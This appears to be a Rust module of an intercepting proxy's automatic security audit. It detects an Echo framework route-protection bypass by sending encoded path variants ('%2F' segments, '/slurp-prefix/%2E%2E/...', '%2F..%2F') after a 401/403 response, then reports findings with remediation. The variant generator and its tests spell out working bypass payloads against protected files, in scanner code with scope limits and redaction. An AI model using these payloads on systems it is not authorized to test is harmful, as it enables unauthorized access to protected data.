//! CVE-2026-118654 / GHSA-3pmx-cf9f-34xr: Echo v5 static file route-protection bypass with
//! encoded dot-dot segments. A protected path returns 403/401, but a public static prefix plus
//! `%2E%2E` is unescaped and path-cleaned to the protected file.
//!
//! The audit is HTTP-only because reqwest/url normalises encoded dot segments before sending.
//! It does not follow redirects, does not write, and redacts any protected response body from
//! retained evidence.
use super::auto_audit::{self as audit, AuditState};
use proxy_core::{Intercept, TrafficEntry};
use serde_json::{json, Value};
use tokio::time::{Duration, Instant};

const ADVISORY: &str = "CVE-2026-118654 (GHSA-3pmx-cf9f-34xr; Echo static file encoded dot-dot bypass)";
const MAX_SENDS: usize = 4;

pub(super) fn eligible(entry: &TrafficEntry) -> bool {
    if entry.method != "GET"
        || !entry.url.starts_with("http://")
        || !matches!(entry.status_code, 401 | 403)
        || !entry.request_body.is_empty()
    {
        return false;
    }
    let Ok(url) = reqwest::Url::parse(&entry.url) else {
        return false;
    };
    // Any protected path can be probed; encoded aliases are a generic route-guard bypass,
    // not only a static-file mount issue. The root has no alias to test.
    url.path() != "/"
}

pub(super) fn key(request: &Value) -> String {
    let url = reqwest::Url::parse(request["url"].as_str().unwrap_or_default()).ok();
    let identity = url
        .as_ref()
        .map(|url| format!("{}|{}", url.origin().ascii_serialization(), url.path()))
        .unwrap_or_else(|| request["url"].as_str().unwrap_or_default().to_string());
    let digest = ring::digest::digest(&ring::digest::SHA256, identity.as_bytes());
    let hex: String = digest.as_ref().iter().map(|byte| format!("{byte:02x}")).collect();
    format!("auto-echo-static-{hex}")
}

#[derive(Clone, Copy, PartialEq)]
enum Kind {
    EncodedSlash,
    EncodedChar,
    DotDot,
    EscapedSeparator,
}

impl Kind {
    fn cve(self) -> &'static str {
        match self {
            Kind::EncodedSlash | Kind::EncodedChar => "CVE-2026-118650",
            Kind::DotDot | Kind::EscapedSeparator => "CVE-2026-118654",
        }
    }
    fn title(self) -> &'static str {
        match self {
            Kind::EncodedSlash | Kind::EncodedChar => {
                "Encoded path bypasses route protection (CVE-2026-118650)"
            }
            Kind::DotDot | Kind::EscapedSeparator => {
                "Encoded dot-dot bypasses route protection (CVE-2026-118654)"
            }
        }
    }
    fn label(self) -> &'static str {
        match self {
            Kind::EncodedSlash => "%2F-encoded path",
            Kind::EncodedChar => "percent-encoded first path character",
            Kind::DotDot => "public prefix plus %2E%2E",
            Kind::EscapedSeparator => "encoded separators with ..",
        }
    }
}

struct Variant {
    kind: Kind,
    target: String,
}

fn variants(path: &str, prefix: &str, query: &str) -> Vec<Variant> {
    let trimmed = path.trim_start_matches('/');
    let segments: Vec<&str> = trimmed.split('/').filter(|segment| !segment.is_empty()).collect();
    let mut out = Vec::new();
    if segments.len() > 1 {
        out.push(Variant {
            kind: Kind::EncodedSlash,
            target: format!("/{}{query}", segments.join("%2F")),
        });
    }
    out.push(Variant {
        kind: Kind::DotDot,
        target: format!("/slurp-{prefix}/%2E%2E{path}{query}"),
    });
    let mut encoded: Vec<String> = segments.iter().map(|segment| segment.to_string()).collect();
    if let Some(first) = encoded.first_mut() {
        if let Some(character) = first.chars().next() {
            *first = format!("%{:02X}{}", character as u32, &first[character.len_utf8()..]);
        }
    }
    out.push(Variant {
        kind: Kind::EncodedChar,
        target: format!("/{}{query}", encoded.join("/")),
    });
    out.push(Variant {
        kind: Kind::EscapedSeparator,
        target: format!("/slurp-{prefix}%2F..%2F{}{query}", segments.join("%2F")),
    });
    out
}

async fn raw_get(request: &Value, target: &str) -> Option<Value> {
    let url = reqwest::Url::parse(request["url"].as_str()?).ok()?;
    if url.scheme() != "http" {
        return None;
    }
    let host = url.host_str()?.to_string();
    let port = url.port_or_known_default()?;
    if target.len() > 4096 || target.chars().any(char::is_control) {
        return None;
    }
    let mut headers = String::new();
    if let Some(map) = request["headers"].as_object() {
        for (name, value) in map {
            if ["host", "connection", "content-length", "transfer-encoding", "accept-encoding"]
                .iter()
                .any(|blocked| name.eq_ignore_ascii_case(blocked))
            {
                continue;
            }
            if let Some(value) = value.as_str() {
                if !value.contains(['\r', '\n']) && value.len() <= 8192 {
                    headers.push_str(&format!("{name}: {value}\r\n"));
                }
            }
        }
    }
    let start = Instant::now();
    let mut stream = tokio::time::timeout(
        Duration::from_secs(5),
        tokio::net::TcpStream::connect((host.as_str(), port)),
    )
    .await
    .ok()?
    .ok()?;
    let wire = format!(
        "GET {target} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\nAccept-Encoding: identity\r\n{headers}\r\n"
    );
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    tokio::time::timeout(Duration::from_secs(5), stream.write_all(wire.as_bytes()))
        .await
        .ok()?
        .ok()?;
    let mut bytes = Vec::new();
    let deadline = Instant::now() + Duration::from_secs(10);
    loop {
        let remaining = deadline.saturating_duration_since(Instant::now());
        if remaining.is_zero() {
            break;
        }
        let mut chunk = [0u8; 8192];
        match tokio::time::timeout(remaining, stream.read(&mut chunk)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(count)) => {
                bytes.extend_from_slice(&chunk[..count]);
                if bytes.len() > 2_000_000 {
                    break;
                }
            }
            _ => break,
        }
    }
    let end = bytes.windows(4).position(|window| window == b"\r\n\r\n")?;
    let head = std::str::from_utf8(&bytes[..end]).ok()?;
    let mut lines = head.split("\r\n");
    let status = lines.next()?.split_whitespace().nth(1)?.parse::<u16>().ok()?;
    let mut response_headers = serde_json::Map::new();
    for line in lines {
        if let Some((name, value)) = line.split_once(':') {
            response_headers.insert(name.trim().to_ascii_lowercase(), json!(value.trim()));
        }
    }
    let body = bytes[end + 4..].to_vec();
    Some(json!({
        "ok": true,
        "status": status,
        "responseHeaders": response_headers,
        "responseBody": String::from_utf8_lossy(&body),
        "bodyBytes": body.len(),
        "duration": start.elapsed().as_millis() as u64,
        "size": body.len(),
    }))
}

fn evidence_item(id: &str, label: &str, request: &Value, result: &Value, redact: bool) -> Value {
    let mut item = json!({
        "id": id,
        "label": label,
        "timestamp": chrono::Utc::now().to_rfc3339(),
        "request": request,
        "setCookies": [],
        "duration": result["duration"].as_u64().unwrap_or(0).min(3_600_000),
        "size": result["size"].as_u64().unwrap_or(0).min(2_000_000),
        "truncated": false,
    });
    if result["ok"] == true {
        let original = result["responseBody"].as_str().unwrap_or_default();
        let body = if redact {
            format!(
                "[protected response body redacted after bypass detection; {} bytes]",
                result["bodyBytes"].as_u64().unwrap_or(0)
            )
        } else {
            audit::preview(original, 32000)
        };
        let mut headers = result["responseHeaders"].as_object().cloned().unwrap_or_default();
        let count = headers.len();
        headers.retain(|_, value| value.as_str().is_some_and(|text| text.len() <= 8192));
        let headers: serde_json::Map<_, _> = headers.into_iter().take(200).collect();
        item["truncated"] = json!(original.chars().count() > 32000 || headers.len() != count);
        item["response"] = json!({
            "status": result["status"],
            "responseHeaders": headers,
            "responseBody": body,
        });
    } else {
        item["error"] = json!(audit::preview(
            result["error"].as_str().unwrap_or("Request failed"),
            4000
        ));
    }
    item
}

pub(super) async fn audit(
    entry: &TrafficEntry,
    id: &str,
    state: &AuditState,
    intercept: &Intercept,
) -> Option<Value> {
    if !state.enabled() || !intercept.scope().matches(&entry.host) {
        return None;
    }
    let original = audit::request(entry)?;
    let url = reqwest::Url::parse(&entry.url).ok()?;
    let path = url.path().to_string();
    let query = url.query().map(|query| format!("?{query}")).unwrap_or_default();
    let nonce = uuid::Uuid::new_v4().simple().to_string();
    let prefix = &nonce[..8];
    let variants = variants(&path, prefix, &query);
    let mut evidence = vec![audit::observed(entry, &original)];
    let mut sent = 0;
    let baseline = raw_get(&original, &format!("{path}{query}")).await?;
    sent += 1;
    evidence.push(evidence_item("echo-baseline", "Literal protected path", &original, &baseline, false));
    if baseline["ok"] != true || !matches!(baseline["status"].as_u64(), Some(401 | 403)) {
        return None;
    }
    let baseline_body = baseline["responseBody"].as_str().unwrap_or_default();
    let baseline_bytes = baseline_body.len();
    let mut finding = None;
    for (index, variant) in variants.iter().enumerate() {
        if sent >= MAX_SENDS {
            break;
        }
        let target = &variant.target;
        let Some(result) = raw_get(&original, target).await else {
            continue;
        };
        sent += 1;
        let mut variant_request = original.clone();
        variant_request["url"] = json!(format!("{}{target}", url.origin().ascii_serialization()));
        evidence.push(evidence_item(
            &format!("echo-variant-{index}"),
            "Encoded static path",
            &variant_request,
            &result,
            true,
        ));
        if result["status"].as_u64() != Some(200) {
            continue;
        }
        let bytes = result["bodyBytes"].as_u64().unwrap_or(0);
        if bytes == 0 || bytes == baseline_bytes as u64 {
            continue;
        }
        let repeat = raw_get(&original, target).await?;
        sent += 1;
        evidence.push(evidence_item(
            &format!("echo-variant-{index}-repeat"),
            "Encoded static path repeat",
            &variant_request,
            &repeat,
            true,
        ));
        if repeat["status"].as_u64() != Some(200)
            || repeat["bodyBytes"].as_u64().unwrap_or(0) != bytes
        {
            continue;
        }
        finding = Some(json!({
            "id": if variant.kind == Kind::EncodedSlash || variant.kind == Kind::EncodedChar {
                "echo-static-encoded-slash"
            } else {
                "echo-static-dotdot"
            },
            "fingerprint": if variant.kind == Kind::EncodedSlash || variant.kind == Kind::EncodedChar {
                "echo-static:encoded-slash"
            } else {
                "echo-static:encoded-dotdot"
            },
            "checkId": "echo-static-bypass",
            "title": variant.kind.title(),
            "summary": format!(
                "The literal protected path returned HTTP {}, but the {} form {target} returned 200 with a different body, twice. This is a route/group authorization bypass when a normalized handler or static mount resolves the encoded path after the router guard was skipped. Echo v5.4.0/v4.16.0 fixed both the middleware.Static %2F mismatch and encoded dot-dot handling; the {} form is consistent with {}. Affected: echo/v5 < 5.4.0 and echo/v4 < 4.16.0, but any stack with the same router/static mismatch should be reviewed. The protected body was redacted from evidence; confirm the Echo version and mounting."
            , baseline["status"], variant.kind.label(), variant.kind.label(), variant.kind.cve()),
            "severity": if variant.kind == Kind::EncodedSlash || variant.kind == Kind::EncodedChar {
                "high"
            } else {
                "medium"
            },
            "confidence": "high",
            "status": "needs_review",
            "evidenceIds": ["observed", "echo-baseline", format!("echo-variant-{index}"), format!("echo-variant-{index}-repeat")],
            "excerpts": [
                format!("Literal path: {path} -> HTTP {}", baseline["status"]),
                format!("Encoded variant: {target} -> HTTP 200, {bytes} body bytes (redacted)"),
            ],
            "remediation": "Upgrade github.com/labstack/echo/v5 to 5.4.0+ (or v4 to 4.16.0+), or reject encoded slashes/dot segments and normalized wildcard values that cross static mount boundaries. Keep protected files outside a global Static root.",
            "verification": {
                "method": "literal versus public-prefix encoded dot-dot static request",
                "outcome": "inconclusive",
                "reason": "The status/body difference is consistent with the advisory but does not prove the Echo version; confirm the module version."
            }
        }));
        break;
    }
    let findings: Vec<Value> = finding.into_iter().collect();
    let checks = vec![json!({
        "checkId": "echo-static-bypass",
        "status": if !findings.is_empty() { "findings" } else { "passed" },
        "message": if findings.is_empty() {
            "No encoded path bypass was observed for the protected 401/403 path."
        } else {
            "An encoded path returned protected content; consistent with the Echo advisories and a route-guard bypass."
        },
        "findingIds": findings.iter().map(|finding| finding["id"].clone()).collect::<Vec<_>>()
    })];
    let mut run = audit::run(entry, id, &original, evidence, findings, checks, sent, "active");
    run["auditKey"] = json!(key(&original));
    run["profileName"] = json!("Automatic Echo static bypass audit");
    run["plan"]["maxRequests"] = json!(MAX_SENDS);
    let _ = ADVISORY;
    Some(run)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn eligibility_requires_protected_get() {
        let mut entry = TrafficEntry::new_request(
            "GET",
            "http://example.test/admin/secret.txt",
            "example.test",
            "/admin/secret.txt",
            "http",
            "{}",
            vec![],
            None,
        );
        entry.status_code = 403;
        assert!(eligible(&entry));
        entry.url = "http://example.test/dashboard".into();
        assert!(eligible(&entry));
        entry.status_code = 200;
        assert!(!eligible(&entry));
        entry.status_code = 403;
        entry.method = "POST".into();
        assert!(!eligible(&entry));
    }

    #[test]
    fn variants_cover_encoded_slash_character_and_dotdot() {
        let variant = variants("/admin/secret.txt", "abc", "");
        assert_eq!(variant[0].target, "/admin%2Fsecret.txt");
        assert!(variant.iter().any(|item| item.target == "/%61dmin/secret.txt"));
        assert!(variant.iter().any(|item| item.target.contains("/slurp-abc/%2E%2E/admin/secret.txt")));
        assert!(variant.iter().any(|item| item.target.contains("%2F..%2Fadmin%2Fsecret.txt")));
    }

}
